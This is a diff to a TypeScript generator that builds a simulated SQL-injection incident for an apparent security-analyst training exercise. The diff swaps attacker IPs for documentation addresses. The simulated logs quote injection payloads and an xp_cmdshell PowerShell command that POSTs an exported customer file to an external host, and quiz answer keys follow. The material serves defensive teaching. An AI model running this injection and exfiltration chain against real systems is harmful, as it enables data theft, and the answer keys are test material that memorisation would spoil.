@@ -65,9 +65,9 @@ export function buildSqliDbExfilScenario(
   const dbIp = "10.30.5.20";
 
   // The attacker's external address, seen at the WAF (upstream of the app).
-  const attackerIp = "194.36.191.47";
+  const attackerIp = "203.0.113.51";
   // The external endpoint the staged customer dump is POSTed to via xp_cmdshell.
-  const exfilIp = "45.83.192.11";
+  const exfilIp = "203.0.113.12";
 
   // The web application's own DB login. It is (mis)configured as sysadmin, which
   // is what later lets the injection enable and drive xp_cmdshell.
@@ -235,7 +235,7 @@ export function buildSqliDbExfilScenario(
       mitre_tactic: "Initial Access",
       incident_id: INCIDENT,
       description:
-        "Imperva blocked a GET to /product/search from 194.36.191.47 whose q parameter carried a boolean tautology (' OR 1=1). The request was answered with HTTP 403 by the production security policy.",
+        "Imperva blocked a GET to /product/search from 203.0.113.51 whose q parameter carried a boolean tautology (' OR 1=1). The request was answered with HTTP 403 by the production security policy.",
       raw: {
         "event.category": "web",
         "event.action": "sql_injection_detected",
@@ -289,7 +289,7 @@ export function buildSqliDbExfilScenario(
       mitre_tactic: "Initial Access",
       incident_id: INCIDENT,
       description:
-        "A UNION SELECT against information_schema.tables from 194.36.191.47 matched an Imperva signature but was recorded with action_result=alerted and forwarded to the origin, which answered HTTP 200, the matching rule sits in a staging policy running in detection mode.",
+        "A UNION SELECT against information_schema.tables from 203.0.113.51 matched an Imperva signature but was recorded with action_result=alerted and forwarded to the origin, which answered HTTP 200, the matching rule sits in a staging policy running in detection mode.",
       raw: {
         "event.category": "web",
         "event.action": "sql_injection_detected",
@@ -350,7 +350,7 @@ export function buildSqliDbExfilScenario(
       mitre_tactic: "Initial Access",
       incident_id: INCIDENT,
       description:
-        "An error-based payload, 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables)), from 194.36.191.47 was again alerted-only under the staging policy and forwarded to the origin (HTTP 200).",
+        "An error-based payload, 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables)), from 203.0.113.51 was again alerted-only under the staging policy and forwarded to the origin (HTTP 200).",
       raw: {
         "event.category": "web",
         "event.action": "sql_injection_detected",
@@ -652,27 +652,27 @@ export function buildSqliDbExfilScenario(
     },
 
     // ─────────────────────────────────────────────────────────────────────
-    // 10. Exfiltration: PowerShell POSTs c.csv to 45.83.192.11 (WAF, DAM, host, firewall).
+    // 10. Exfiltration: PowerShell POSTs c.csv to 203.0.113.12 (WAF, DAM, host, firewall).
     // ─────────────────────────────────────────────────────────────────────
     wafPass("sqli_08h_waf_powershell_post", T(12 * MIN + 58 * SEC),
-      "laptop'; EXEC master..xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"'-- -", "4471920407716652"),
+      "laptop'; EXEC master..xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://203.0.113.12/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"'-- -", "4471920407716652"),
     dam("sqli_09_xpcmdshell_exfil", T(13 * MIN), {
       severity: "critical", type: "EXEC", db: "master", action: "stored_procedure_exec", procedure: "xp_cmdshell",
       mitre: "T1567", tactic: "Exfiltration", techName: "Exfiltration Over Web Service",
-      text: "EXEC master..xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"'",
-      desc: "Guardium recorded xp_cmdshell running a PowerShell Invoke-WebRequest POST of C:\\Windows\\Temp\\c.csv to http://45.83.192.11/u on login app_shop.",
+      text: "EXEC master..xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://203.0.113.12/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"'",
+      desc: "Guardium recorded xp_cmdshell running a PowerShell Invoke-WebRequest POST of C:\\Windows\\Temp\\c.csv to http://203.0.113.12/u on login app_shop.",
     }),
     sysmonProcess({
       ...hostCtx, id: "sqli_09a_host_cmd_powershell", ts: T(13 * MIN + 1 * SEC),
       processName: "cmd.exe", processPath: CMDPATH,
-      cmdline: "cmd.exe /c powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"",
+      cmdline: "cmd.exe /c powershell -c \"Invoke-WebRequest -Uri http://203.0.113.12/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"",
       pid: 6290, ...sqlParent, sha256: cmdHash, signed: true, integrity: "System", runAsUser: SQLSVC, mitre: "T1059.003", tactic: "Execution", severity: "high",
       description: "Sysmon 1 on MSSQL-SHOP-01: sqlservr.exe started cmd.exe /c powershell ... Invoke-WebRequest.",
     }),
     sysmonProcess({
       ...hostCtx, id: "sqli_09b_host_powershell", ts: T(13 * MIN + 2 * SEC),
       processName: "powershell.exe", processPath: PSPATH,
-      cmdline: "powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"",
+      cmdline: "powershell -c \"Invoke-WebRequest -Uri http://203.0.113.12/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"",
       pid: 6340, parentName: "cmd.exe", parentPath: CMDPATH, parentPid: 6290,
       sha256: psHash, signed: true, integrity: "System", runAsUser: SQLSVC, mitre: "T1059.001", tactic: "Execution", severity: "high",
       description: "Sysmon 1 on MSSQL-SHOP-01: cmd.exe started powershell.exe with an Invoke-WebRequest POST of c.csv.",
@@ -682,7 +682,7 @@ export function buildSqliDbExfilScenario(
       ...hostCtx, id: "sqli_09c_host_connect", ts: T(13 * MIN + 4 * SEC),
       processName: "powershell.exe", processPath: PSPATH, pid: 6340, remoteIp: exfilIp, remotePort: 80,
       mitre: "T1567", tactic: "Exfiltration", severity: "high",
-      description: "Sysmon 3 on MSSQL-SHOP-01: powershell.exe connected to 45.83.192.11:80.",
+      description: "Sysmon 3 on MSSQL-SHOP-01: powershell.exe connected to 203.0.113.12:80.",
       }),
       process: { name: "powershell.exe", pid: 6340, path: PSPATH, parent_name: "cmd.exe", parent_pid: 6290, user: SQLSVC },
     },
@@ -692,7 +692,7 @@ export function buildSqliDbExfilScenario(
       hostname: "FW-DMZ-01", src_ip: dbIp, dst_ip: exfilIp, src_port: 50322, dst_port: 80, protocol: "tcp",
       severity: "high", mitre_technique: "T1567", mitre_tactic: "Exfiltration", incident_id: INCIDENT,
       network: { bytes_out: 41_562_144, bytes_in: 612 },
-      description: "FW-DMZ-01 allowed tcp/80 from MSSQL-SHOP-01 (10.30.5.20) to 45.83.192.11, 41,562,144 bytes sent, rule Servers-Egress-Any.",
+      description: "FW-DMZ-01 allowed tcp/80 from MSSQL-SHOP-01 (10.30.5.20) to 203.0.113.12, 41,562,144 bytes sent, rule Servers-Egress-Any.",
       raw: {
         "pan.type": "TRAFFIC",
         "pan.subtype": "end",
@@ -717,7 +717,7 @@ export function buildSqliDbExfilScenario(
   const iocs: IOC[] = [
     {
       type: "ip",
-      value: attackerIp, // 194.36.191.47, the injection source seen at the WAF
+      value: attackerIp, // 203.0.113.51, the injection source seen at the WAF
       first_seen: T(0),
       last_seen: T(12 * MIN + 58 * SEC),
       reputation: "malicious",
@@ -725,7 +725,7 @@ export function buildSqliDbExfilScenario(
     },
     {
       type: "ip",
-      value: exfilIp, // 45.83.192.11, the outbound POST target
+      value: exfilIp, // 203.0.113.12, the outbound POST target
       first_seen: T(13 * MIN + 4 * SEC),
       last_seen: T(13 * MIN + 16 * SEC),
       reputation: "malicious",
@@ -807,7 +807,7 @@ export function buildSqliDbExfilScenario(
       ],
       answer: "rides_app",
       explanation:
-        "SQL injection executes through the vulnerable application, so the database sees the application's connection: db.user=app_shop, source WEB-APP-02 / 10.30.4.15, application '.Net SqlClient Data Provider'. The attacker's 194.36.191.47 never appears at the DB tier, it is upstream at the WAF. That is the whole reason DAM alone understates the source: you correlate by query content and timing across the WAF and app logs to place the real origin. app_shop is the application's service login, not a human DBA (no local interactive login exists). The DB is not internet-exposed, it is reached via the app. And a DAM source IP is the TCP peer (the app server), not a value the attacker can spoof through the injected string.",
+        "SQL injection executes through the vulnerable application, so the database sees the application's connection: db.user=app_shop, source WEB-APP-02 / 10.30.4.15, application '.Net SqlClient Data Provider'. The attacker's 203.0.113.51 never appears at the DB tier, it is upstream at the WAF. That is the whole reason DAM alone understates the source: you correlate by query content and timing across the WAF and app logs to place the real origin. app_shop is the application's service login, not a human DBA (no local interactive login exists). The DB is not internet-exposed, it is reached via the app. And a DAM source IP is the TCP peer (the app server), not a value the attacker can spoof through the injected string.",
     },
     {
       id: "sqli_q4",
@@ -831,17 +831,17 @@ export function buildSqliDbExfilScenario(
       xp: 85,
       kind: "single",
       prompt:
-        "You are scoping containment. Injection reached the DB through a detection-mode WAF rule, 248,915 customer records were read, exported to c.csv and POSTed to 45.83.192.11, and the app login is sysadmin. Which response matches the evidence?",
+        "You are scoping containment. Injection reached the DB through a detection-mode WAF rule, 248,915 customer records were read, exported to c.csv and POSTed to 203.0.113.12, and the app login is sysadmin. Which response matches the evidence?",
       hint: "Address the passthrough, the over-privilege, the OS-command path, the egress, and the confirmed data loss, not just the source IP.",
       options: [
-        { value: "full_scope", label: "Set the Imperva SQLi rules to blocking, remove sysadmin from app_shop and rotate it, disable xp_cmdshell, block and hunt egress to 45.83.192.11, and treat the Customers PII as breached" },
-        { value: "block_src", label: "Block 194.36.191.47 at the WAF and add its /24 to the deny list, cutting off the injecting source stops further queries and closes the incident without touching the DB" },
+        { value: "full_scope", label: "Set the Imperva SQLi rules to blocking, remove sysadmin from app_shop and rotate it, disable xp_cmdshell, block and hunt egress to 203.0.113.12, and treat the Customers PII as breached" },
+        { value: "block_src", label: "Block 203.0.113.51 at the WAF and add its /24 to the deny list, cutting off the injecting source stops further queries and closes the incident without touching the DB" },
         { value: "reimage_web", label: "Reimage WEB-APP-02 and redeploy the storefront code, the injection came through the web tier, so rebuilding it removes the vulnerability and ends the data exposure" },
         { value: "reset_bi", label: "Reset the svc_powerbi account and revoke its reporting access, since the large customer read matches the same high-volume query pattern that service account runs nightly" },
       ],
       answer: "full_scope",
       explanation:
-        "The evidence names each fix. The injection succeeded because the matching WAF rules were in detection mode, so they must go to blocking. app_shop being sysadmin is what enabled xp_cmdshell, so remove the role and rotate the credential, and disable xp_cmdshell. The dump was POSTed to 45.83.192.11, so block that egress and hunt for what else reached it. And because 248,915 real customer records (with password hashes and card-last-four) were successfully read and sent off-box, the PII must be handled as a confirmed breach for notification. Blocking only 194.36.191.47 leaves the detection-mode gap, the sysadmin login and xp_cmdshell in place for the next source. Reimaging the web server does not fix an over-privileged DB login or the WAF policy. And svc_powerbi is the benign control, a scheduled parameterized reporting read against a view, not the exfil path.",
+        "The evidence names each fix. The injection succeeded because the matching WAF rules were in detection mode, so they must go to blocking. app_shop being sysadmin is what enabled xp_cmdshell, so remove the role and rotate the credential, and disable xp_cmdshell. The dump was POSTed to 203.0.113.12, so block that egress and hunt for what else reached it. And because 248,915 real customer records (with password hashes and card-last-four) were successfully read and sent off-box, the PII must be handled as a confirmed breach for notification. Blocking only 203.0.113.51 leaves the detection-mode gap, the sysadmin login and xp_cmdshell in place for the next source. Reimaging the web server does not fix an over-privileged DB login or the WAF policy. And svc_powerbi is the benign control, a scheduled parameterized reporting read against a view, not the exfil path.",
     },
   ];
 
@@ -851,14 +851,14 @@ export function buildSqliDbExfilScenario(
     threat_actor: "External web attacker automating SQL injection against a public storefront",
     attack_kind: "sql_injection",
     briefing:
-      "Imperva raised SQL-injection alerts against shop.nexacorp.com's /product/search endpoint from 194.36.191.47 late on 14 Jul, and the DB team saw unusual reads on ShopDB. Work out whether anything got past the WAF, what the database and its host actually did, and how much data is at risk.",
-    narrative: `shop.nexacorp.com is Nexacorp's internet-facing storefront, fronted by an Imperva WAF. Just before 22:40 an attacker at 194.36.191.47 began probing the product-search endpoint with automated SQL injection. The first payload, a classic ' OR 1=1 tautology, was caught cleanly: Imperva's production security policy blocked it and returned HTTP 403. On a WAF dashboard alone the story could have ended there, as a blocked attempt.
+      "Imperva raised SQL-injection alerts against shop.nexacorp.com's /product/search endpoint from 203.0.113.51 late on 14 Jul, and the DB team saw unusual reads on ShopDB. Work out whether anything got past the WAF, what the database and its host actually did, and how much data is at risk.",
+    narrative: `shop.nexacorp.com is Nexacorp's internet-facing storefront, fronted by an Imperva WAF. Just before 22:40 an attacker at 203.0.113.51 began probing the product-search endpoint with automated SQL injection. The first payload, a classic ' OR 1=1 tautology, was caught cleanly: Imperva's production security policy blocked it and returned HTTP 403. On a WAF dashboard alone the story could have ended there, as a blocked attempt.
 
 It did not. The next two payloads, a UNION SELECT against information_schema.tables and an error-based CONVERT() extraction, matched Imperva signatures too, but those rules were sitting in a STAGING policy running in detection (count) mode. They alerted and then forwarded the requests to the origin, which answered HTTP 200. The malicious queries executed. This is the crux of the exercise: "the WAF logged it" is not "the WAF stopped it".
 
 At the database, IBM Guardium recorded the injection arriving on the web application's own DB login, app_shop, from the web tier WEB-APP-02, the attacker's own address never reaches the DB, because injection runs inside the app's session. First an error-based CONVERT() failed with SQL error 245 and leaked a table name ('Customers') in its error text. Then a UNION dumped 612 rows from INFORMATION_SCHEMA.COLUMNS, mapping the schema. Then the payoff: an unparameterized SELECT of dbo.Customers returned 248,915 rows, email, password hashes, card-last-four, moving 41.5 MB in the session. SQL Server's own native audit independently logged the same statement with response_rows 248,915.
 
-Because app_shop was misconfigured as sysadmin, the operator did not stop at reading. sp_configure turned on xp_cmdshell and EXEC master..xp_cmdshell 'whoami' made sqlservr.exe start cmd.exe on the database host (MSSQL-SHOP-01, 10.30.5.20) as the SQL Server service account: OS command execution reached straight from a web injection. At 22:52 xp_cmdshell ran bcp to export the customer table to C:\\Windows\\Temp\\c.csv (41.5 MB, sha256 on the Sysmon file record), and at 22:53 a new cmd.exe and PowerShell POSTed that file to the external host 45.83.192.11, which the data-centre firewall allowed on tcp/80. Every one of these requests was also logged by Imperva under the detection-mode staging policy. The benign comparison in the data is the 03:00 Power BI job: svc_powerbi returning 184,920 rows from a reporting view, the same "big database read" shape as the exfil, but a scheduled service account, parameterized, against a view, not the live PII table.`,
+Because app_shop was misconfigured as sysadmin, the operator did not stop at reading. sp_configure turned on xp_cmdshell and EXEC master..xp_cmdshell 'whoami' made sqlservr.exe start cmd.exe on the database host (MSSQL-SHOP-01, 10.30.5.20) as the SQL Server service account: OS command execution reached straight from a web injection. At 22:52 xp_cmdshell ran bcp to export the customer table to C:\\Windows\\Temp\\c.csv (41.5 MB, sha256 on the Sysmon file record), and at 22:53 a new cmd.exe and PowerShell POSTed that file to the external host 203.0.113.12, which the data-centre firewall allowed on tcp/80. Every one of these requests was also logged by Imperva under the detection-mode staging policy. The benign comparison in the data is the 03:00 Power BI job: svc_powerbi returning 184,920 rows from a reporting view, the same "big database read" shape as the exfil, but a scheduled service account, parameterized, against a view, not the live PII table.`,
     learning_objectives: [
       "Distinguish a WAF that blocked an injection (action_result=blocked, 403) from one that only detected it (action_result=alerted, origin 200) and understand that a detection-mode rule still lets the attack through",
       "Follow SQL injection from the WAF layer into the database and read Guardium / SQL Server audit records, query.text, rows_returned, sql.error, response_rows, as the ground truth of what executed",
